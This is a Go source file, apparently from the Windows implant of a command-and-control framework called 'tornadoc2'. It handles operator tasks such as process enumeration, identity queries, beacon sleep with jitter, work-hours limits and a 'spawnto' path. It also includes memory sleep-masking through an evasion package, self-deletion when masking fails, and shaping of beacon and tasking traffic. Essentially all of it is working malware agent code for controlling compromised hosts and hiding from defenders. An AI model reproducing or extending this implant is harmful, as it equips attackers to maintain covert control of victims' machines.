//go:build windows

package core

import (
	"fmt"
	"os"
	"strings"
	"time"
	"tornadoc2/agent/evasion"
	"tornadoc2/agent/features"
	"tornadoc2/agent/native"
	"tornadoc2/agent/platform"
	"tornadoc2/agent/protocol"
)

func (a *Agent) psVerb(t protocol.Task) protocol.Result {
	diag("[ps] enumerating processes\n")
	out, err := native.NativePS()
	if err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
}
func (a *Agent) idVerb(t protocol.Task) protocol.Result {
	diag("[id] querying identity\n")
	out, err := native.NativeID()
	if err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
}
func (a *Agent) sleepVerb(t protocol.Task) protocol.Result {
	if len(t.Args) < 1 {
		return protocol.Result{ID: t.ID, Error: "sleep requires seconds"}
	}
	var secs int
	if _, err := fmt.Sscanf(t.Args[0], "%d", &secs); err != nil || secs < 0 {
		return protocol.Result{ID: t.ID,
			Error: "invalid interval (>= 0 required)"}
	}
	a.session.Sleep = secs
	if len(t.Args) > 1 {
		var j float64
		if _, err := fmt.Sscanf(t.Args[1], "%f", &j); err == nil {
			a.session.Jitter = j
		}
	}
	diag("[sleep] interval changed to %ds jitter=%.2f\n",
		a.session.Sleep, a.session.Jitter)
	return protocol.Result{ID: t.ID,
		Output: encodeOutput([]byte(fmt.Sprintf("sleep=%d jitter=%.2f\n",
			a.session.Sleep, a.session.Jitter)))}
}
func (a *Agent) workhoursVerb(t protocol.Task) protocol.Result {
	if len(t.Args) == 0 {
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(
			fmt.Sprintf("workhours=%s\n", formatWorkHours())))}
	}
	if len(t.Args) == 1 {
		arg := strings.ToLower(t.Args[0])
		if arg == "off" || arg == "disable" {
			protocol.WorkHoursStart = 0
			protocol.WorkHoursEnd = 0
			diag("[workhours] disabled\n")
			return protocol.Result{ID: t.ID, Output: encodeOutput(
				[]byte("workhours=off\n"))}
		}
		return protocol.Result{ID: t.ID,
			Error: "workhours <start> <end> | workhours off"}
	}
	start, ok1 := ParseClock(t.Args[0])
	end, ok2 := ParseClock(t.Args[1])
	if !ok1 || !ok2 {
		return protocol.Result{ID: t.ID,
			Error: "invalid clock format, expected HH:MM"}
	}
	protocol.WorkHoursStart = start
	protocol.WorkHoursEnd = end
	diag("[workhours] set to %s\n", formatWorkHours())
	return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(
		fmt.Sprintf("workhours=%s\n", formatWorkHours())))}
}
func (a *Agent) spawntoVerb(t protocol.Task) protocol.Result {
	if len(t.Args) < 1 {
		cur := a.spawnTo
		if cur == "" {
			cur = "<default>"
		}
		return protocol.Result{ID: t.ID,
			Output: encodeOutput([]byte("spawnto=" + cur + "\n"))}
	}

	v := strings.TrimSpace(t.Args[0])

	if v == "" || v == "-" {
		a.spawnTo = ""
		diag("[spawnto] cleared — reverting to default worker path\n")
		return protocol.Result{ID: t.ID,
			Output: encodeOutput([]byte("spawnto=<default>\n"))}
	}

	if len(v) > 512 {
		return protocol.Result{ID: t.ID,
			Error: "spawnto path is too long (max 512 characters)"}
	}
	if strings.ContainsAny(v, "\r\n\x00") {
		return protocol.Result{ID: t.ID,
			Error: "spawnto path contains control bytes"}
	}

	a.spawnTo = v
	diag("[spawnto] set to %q\n", v)
	return protocol.Result{ID: t.ID,
		Output: encodeOutput([]byte("spawnto=" + v + "\n"))}
}
func (a *Agent) simpleVerb(t protocol.Task, payload []byte) protocol.Result {
	return protocol.Result{ID: t.ID, Output: encodeOutput(payload)}
}
func (a *Agent) sleep() {
	base := a.session.Sleep
	if base < 0 {
		base = 0
	}

	if base == 0 {
		diag("[sleep] interval is 0 — polling again in 100ms\n")
		time.Sleep(100 * time.Millisecond)
		return
	}

	jitter := a.session.Jitter
	if jitter < 0 {
		jitter = 0
	}
	if jitter > 1 {
		jitter = 1
	}

	a.rngMu.Lock()
	extra := a.rng.Float64() * float64(base) * jitter
	a.rngMu.Unlock()

	total := time.Duration(float64(base)+extra) * time.Second
	diag("[sleep] sleeping %v (base=%ds jitter=%.2f extra=%v)\n",
		total, base, jitter, time.Duration(extra*float64(time.Second)))

	if SleepMaskEnabled && total > 5*time.Second {
		ms := uint32(total.Milliseconds())
		diag("[sleep] attempting masked sleep type=%q %dms\n",
			SleepMaskType, ms)
		if err := evasion.MaskedSleep(SleepMaskType, ms); err != nil {
			diag("[sleep] mask failed: %v — refusing to sleep "+
				"in plaintext; exiting\n", err)
			_ = platform.SelfDelete()
			os.Exit(1)
		}
		return
	}

	deadline := time.Now().Add(total)
	for {
		now := time.Now()
		if !now.Before(deadline) {
			break
		}
		if !a.deadline.IsZero() && now.After(a.deadline) {
			diag("[sleep] interrupted by kill deadline\n")
			break
		}
		step := 30 * time.Second
		if remaining := deadline.Sub(now); remaining < step {
			step = remaining
		}
		time.Sleep(step)
	}
	diag("[sleep] wake\n")
}
func (a *Agent) shapeForOp(op, direction string) *features.ShapeSpec {
	if a.shaping == nil {
		return nil
	}
	switch op {
	case "beacon":
		if direction == "response" {
			return a.shaping.CheckinResponse
		}
	case "tasks":
		if direction == "response" {
			return a.shaping.TasksResponse
		}
	case "results":
		if direction == "request" {
			return a.shaping.ResultsRequest
		}
	}
	return nil
}
